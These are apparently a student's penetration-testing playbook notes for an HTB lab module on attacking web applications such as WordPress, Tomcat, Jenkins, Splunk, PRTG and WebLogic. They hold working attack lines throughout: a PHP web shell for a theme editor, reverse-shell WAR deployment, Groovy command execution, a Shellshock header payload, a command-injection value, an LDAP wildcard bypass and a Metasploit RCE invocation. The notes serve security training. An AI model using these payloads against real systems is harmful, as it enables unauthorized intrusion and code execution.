# Attacking Common Applications — Playbook

Consolidated methodology and per-application playbooks for the HTB "Attacking Common Applications" module. Built from module content only. Use this as the reference during the three skills assessments.

---

## Core Mindset

Two attack angles, always weighed together:
1. **Public CVEs** against a fingerprinted version.
2. **Abuse built-in functionality** (script consoles, task runners, template/theme editors, upload forms, APIs) → RCE. Often more reliable than chasing CVEs.

Bread-and-butter wins: **default creds, unpatched versions, misconfigurations.** These apps are frequently the only foothold in a hardened environment. Loot creds from every app and **reuse them everywhere** (password reuse across services is the norm).

---

## Phase 1 — Discovery & Enumeration (do this first, every time)

1. Nmap web sweep, save XML:
   `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list`
2. Full/deeper scan when a single target:
   `nmap -p- -sC -sV --open --min-rate=1000 <target>`
3. Screenshot triage:
   `eyewitness --web -x web_discovery.xml -d out --no-prompt` (also suggests default creds)
   `cat web_discovery.xml | ./aquatone -nmap`
4. Review High Value Targets first. Note dev/qa vhosts (debug modes, untested features).
5. Manually validate everything interesting. Add vhosts to `/etc/hosts`.

**Port → app quick map:**
- 8080/8180/8009 → Tomcat  | 8000 → Jenkins/Splunkweb  | 8089 → Splunk mgmt
- 7001 → WebLogic  | 389/636 → LDAP/OpenLDAP  | 80/443 → any CMS/IIS
- 5985 → WinRM  | 3790/8834 etc → other consoles

---

## Phase 2 — Per-Application Playbooks

### WordPress
- Fingerprint: `curl -s http://t/ | grep WordPress`; `robots.txt` shows `/wp-admin`, `/wp-content`; meta generator = version.
- Enumerate plugins/themes: grep homepage AND individual posts (`/?p=1`, `/?p=2`); `readme.txt`/`CHANGELOG.txt` for versions.
- `wpscan --url http://t --enumerate ap,at,u --api-token <t>` (passive — misses non-homepage plugins; always add manual).
- User enum: login error messages differ for valid vs invalid users. XML-RPC brute via wpscan.
- **RCE:** admin → Appearance → Theme Editor → edit 404.php with bare `system($_GET[0]);` (NO php tags) → hit `/wp-content/themes/<theme>/404.php?0=id`. Or plugin upload.
- Known lab plugins: mail-masta 1.0 (unauth LFI/SQLi), wpDiscuz 7.0.4 (unauth RCE).

### Joomla
- Fingerprint: `robots.txt`, `/administrator/`, `README.txt`, `/language/en-GB/en-GB.xml` (version), `/media/system/js/` .
- `droopescan scan joomla -u http://t`; `joomlascan`.
- Brute admin: `joomla-brute.py -u http://t -w <wordlist> -usr admin`.
- **RCE:** admin → Templates → edit a template PHP file → browse to it. (default admin path `/administrator`)
- CVE-2019-10945 dir traversal; CVE-2017-8917 SQLi.

### Drupal
- Fingerprint: `CHANGELOG.txt`, `/core/CHANGELOG.txt`, header `X-Generator: Drupal`, `/user/login`.
- `droopescan scan drupal -u http://t`.
- **RCE options:** PHP Filter module (enable, create article with PHP) ; Drupalgeddon (CVE-2014-3704 SQLi), Drupalgeddon2 (CVE-2018-7600 unauth RCE), Drupalgeddon3 (CVE-2018-7602). Use the exploit script matching the version.

### Tomcat
- Fingerprint: `/manager/html`, `/host-manager/html`, error pages show version; `/docs`.
- Default creds on `/manager` — need role **manager-script** (manager-gui does NOT allow the text API).
- **RCE:** build WAR (`msfvenom -p java/jsp_shell_reverse_tcp ... -f war > shell.war`), deploy via text API:
  `curl -u tomcat:pass --upload-file shell.war "http://t:8180/manager/text/deploy?path=/shell"` → hit `/shell/`.
- CSRF token is session-bound — use a cookie jar for token fetch + upload.
- CVE-2019-0232 (Tomcat CGI, Windows) — `/cgi-bin/x.bat?&c%2Fc+whoami` batchfile arg injection.

### Jenkins
- Fingerprint: `/login`, `X-Jenkins` header shows version; port 8000/8080.
- Default/weak creds; check for open registration and anonymous read.
- **RCE:** Manage Jenkins → Script Console (`/script`) → Groovy:
  `def cmd="whoami".execute();println(cmd.text)` or a Groovy reverse shell.
- Crumb (CSRF) is session-bound — use `requests.Session()`.

### Splunk
- Ports 8000 (web) / 8089 (mgmt). Default `admin:changeme`; trial→free reverts to **no auth**.
- **RCE:** deploy a custom app bundle with a scripted input that runs a reverse shell (Splunk runs it).
  Use `splunk_shell` / reverse-shell app; **on Windows use PowerShell** (Python reverse shell fails on Windows).
- Read files with `type` in a Windows shell (not `cat`).

### PRTG Network Monitor
- Port 8080; default `prtgadmin:prtgadmin` / `Password123`.
- **CVE-2018-9276** (authenticated RCE): create a notification with a Parameter field `test.txt;<cmd>` (command injection via the notification param) → triggers as SYSTEM.

### osTicket
- Ticketing — look for sensitive ticket data; email registration abuse; may leak creds usable elsewhere.

### GitLab
- Fingerprint: `/users/sign_in`, `/help` shows version.
- Check open registration, public repos, old commits for creds/SSH keys.
- Username enum via signup/`/<user>.keys`. Version → known CVEs.

### Tomcat CGI / Shellshock
- CVE-2019-0232: Windows Tomcat CGI batch arg injection (see Tomcat above).
- **Shellshock (CVE-2014-6271):** vulnerable CGI (`/cgi-bin/*.sh`, `.cgi`); inject via a header:
  `curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://t/cgi-bin/x.sh`
  Confirm with `nmap --script http-shellshock`.

### Thick Client Apps
- Enumerate binaries; decompile .NET with **dnSpy** to read source/creds; debug native with x64dbg.
- Section 21 gotchas: run PowerShell as NORMAL user (admin bypasses the Temp block); apply perms to `Temp\2\` directly; if the batch fails, run `& C:\ProgramData\monta.ps1` from a Start-menu PowerShell.

### ColdFusion
- Fingerprint: `/CFIDE/administrator/`, port 8500; error pages show version.
- CVE-2010-2861 LFI (`/CFIDE/administrator/enter.cfm?...` locale traversal to read `password.properties`).
- CVE-2009-2265 (FCKeditor file upload → RCE). Match exploit to version.

### IIS Tilde Enumeration
- `java -jar iis_shortname_scanner.jar 0 5 http://t/` → 8.3 short names (e.g. `TRANSF~1.ASP`).
- Recover full name: `egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > list.txt` then
  `gobuster dir -u http://t/ -w list.txt -x .aspx,.asp` (try both extensions).

### LDAP (Injection)
- Indicator: HTTP login + LDAP/OpenLDAP (389) on same host.
- Auth bypass: username `*`, password `*` (wildcard makes the LDAP filter always-true).
- `ldapsearch -H ldap://t:389 -D "<binddn>" -w <pass> -b "<basedn>" "<filter>"`.

### Web Mass Assignment
- White-box: find the request field bound to a privileged/approval attribute (`request.form['<name>']`).
- Add that field to the request (e.g. registration) with any non-empty value to set the hidden attribute (approval/admin bypass).

### Apps Connecting to Services
- ELF: `gdb ./bin` → `b SQLDriverConnect; run; x/s $rdx` → read `UID`/`PWD` from the connection string (strings are chunked/reversed, so debug at runtime).
- .NET DLL: `Get-FileMetaData` to identify → open in **dnSpy** → read connection string from the controller source.
- Reuse recovered DB creds against MSSQL and password-spray other services.

### Other Notable Apps (honorable mentions)
- Axis2 (AAR webshell), Websphere (`system:manager` → WAR), Elasticsearch, Zabbix (API RCE), Nagios (`nagiosadmin:PASSW0RD`), **WebLogic** (port 7001, Java deserialization / console CVEs), Wikis/SharePoint (search → creds), DotNetNuke, vCenter (CVE-2021-22005).
- **WebLogic CVE-2020-14882/14883** (10.3.6/12.1.3/12.2.1.3/12.2.1.4/14.1.1):
  Verify bypass: `curl -i "http://t:7001/console/css/%252e%252e%252fconsole.portal"` → redirect to HomePage1 = vulnerable.
  Exploit: `msfconsole -q -x "use exploit/multi/http/weblogic_admin_handle_rce; set RHOSTS t; set RPORT 7001; set LHOST tun0; run"` (default target 4 PowerShell Stager). Often runs as SYSTEM.

---

## Phase 3 — Decision Flow

1. Screenshot report → identify each app + version.
2. For each: try **default/weak creds** first (EyeWitness suggestions, known defaults).
3. If admin access → **built-in functionality → RCE** (theme/template editor, script console, WAR/app deploy, notification/task runner).
4. If no creds → match **version to a public CVE**; prefer unauth RCE. Verify the vuln before firing a big payload.
5. On foothold → loot config files/binaries for creds → **reuse across all other apps and services**.
6. Windows shells: read files with `type`; meterpreter uses `cat`. Prefer PowerShell payloads on Windows.

---

## Recurring Gotchas
- Homepage-only enumeration misses plugins/functionality — check inner pages.
- CSRF/crumb tokens are session-bound — always use a cookie jar / `requests.Session()`.
- manager-gui ≠ manager-script for Tomcat text API.
- Flag/loot filenames in webroots are unique — `ls`/`dir` first.
- Match the exploit to BOTH the product AND the exact version (searchsploit "WebLogic" etc. is noisy).
- Verify a vuln (auth bypass, RCE callback) before deploying a full reverse shell.
